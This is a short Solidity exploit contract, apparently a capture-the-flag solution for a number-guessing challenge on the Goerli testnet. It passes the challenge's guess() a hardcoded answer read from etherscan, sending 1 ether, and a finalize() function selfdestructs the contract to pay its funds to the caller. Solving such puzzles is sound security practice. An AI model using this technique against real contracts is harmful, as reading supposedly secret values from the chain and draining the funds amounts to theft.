// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "hardhat/console.sol";

interface IChallenge_iflp {
    function guess(uint256 n) external payable;
}

interface ILollercoaster_iflp {
    function randInt(uint256 n) external view returns (uint256);
}

contract Exploit_iflp {
    constructor(IChallenge_iflp instance) payable {
        // taken from etherscan
        // https://goerli.etherscan.io/address/0x25Be61724B64117DC9aC9DDd2A06B7DEc052D5cb#readContract
        instance.guess{value: 1 ether}(1011337101);
    }

    function finalize() external {
        selfdestruct(payable(msg.sender));
    }
}
